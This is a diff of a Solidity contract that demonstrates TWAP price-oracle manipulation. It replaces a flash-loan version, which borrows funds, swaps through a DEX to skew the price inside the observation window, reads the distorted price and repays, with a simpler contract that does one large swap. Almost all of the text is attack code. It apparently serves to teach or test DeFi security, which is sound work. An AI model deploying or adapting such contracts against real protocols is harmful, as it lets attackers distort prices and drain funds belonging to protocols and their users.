@@ -2,50 +2,29 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
-interface IERC20 {
-    function transfer(address, uint256) external returns (bool);
-}
-
 interface ITwap {
+    function sync() external;
+    function swap1To0(uint256 amountIn) external;
     function consult(address token, uint256 amountIn) external view returns (uint256);
 }
 
-interface IDex {
-    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);
+interface IERC20 {
+    function approve(address spender, uint256 amount) external returns (bool);
 }
 
-interface IFlashLender {
-    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
-}
+/// @notice TWAP oracle manipulation: one large swap (flash-borrowed capital)
+///         dominates the short observation window and moves the TWAP.
+contract TwapAttack {
+    ITwap public pool;
+    IERC20 public token1;
 
-contract TwapManipulation {
-    ITwap public twap;
-    IDex public dex;
-    IFlashLender public lender;
-
-    constructor(address _twap, address _dex, address _lender) {
-        twap = ITwap(_twap);
-        dex = IDex(_dex);
-        lender = IFlashLender(_lender);
+    constructor(address _pool, address _token1) {
+        pool = ITwap(_pool);
+        token1 = IERC20(_token1);
     }
 
-    function attack(address tokenIn, address tokenOut, uint256 amount) external {
-        lender.flashLoan(address(this), tokenIn, amount, abi.encode(tokenIn, tokenOut));
-    }
-
-    function onFlashLoan(address token, uint256 amount, bytes calldata data) external {
-        (address tokenIn, address tokenOut) = abi.decode(data, (address, address));
-
-        // Push price inside the observation window
-        address[] memory path = new address[](2);
-        path[0] = tokenIn;
-        path[1] = tokenOut;
-        dex.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
-
-        // Oracle now reports a distorted price; trigger the dependent action
-        uint256 distortedPrice = twap.consult(tokenOut, 1e18);
-
-        // Repay the flash loan
-        IERC20(token).transfer(msg.sender, amount);
+    function attack(uint256 amountIn) external {
+        token1.approve(address(pool), amountIn);
+        pool.swap1To0(amountIn);
     }
 }
